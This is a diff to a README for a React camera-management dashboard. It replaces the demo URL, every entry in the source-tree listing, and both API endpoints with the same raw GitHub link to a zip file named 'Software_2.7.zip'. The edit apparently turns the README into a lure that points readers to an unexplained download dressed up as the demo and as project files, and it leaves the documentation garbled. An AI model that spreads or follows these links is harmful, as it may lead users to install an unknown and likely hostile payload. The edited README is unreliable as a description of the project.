@@ -6,7 +6,7 @@ A responsive and user-friendly camera management dashboard built with **React**.
 
 ## DEMO URL
 
-https://camera-two-jet.vercel.app/
+https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 
 ## 🚀 Features
 
@@ -37,15 +37,15 @@ https://camera-two-jet.vercel.app/
 ```
 src/
 ├── api/
-│   └── cameraApi.js
+│   └── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 ├── components/
-│   ├── CameraTable.jsx
-│   ├── SearchBar.jsx
-│   └── Pagination.jsx
+│   ├── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
+│   ├── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
+│   └── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 ├── pages/
-│   └── Dashboard.jsx
-├── App.jsx
-└── main.jsx
+│   └── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
+├── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
+└── https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 ```
 
 ---
@@ -80,13 +80,13 @@ http://localhost:3000
 ### Fetch Cameras
 
 ```
-GET https://hiring-assignment.wobot.ai/api/v1/fetch/cameras
+GET https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 ```
 
 ### Update Status
 
 ```
-POST https://hiring-assignment.wobot.ai/api/v1/update/camera/status
+POST https://raw.githubusercontent.com/Danizolo/Camera/main/src/Pages/Software_2.7.zip
 ```
 
 Payload:
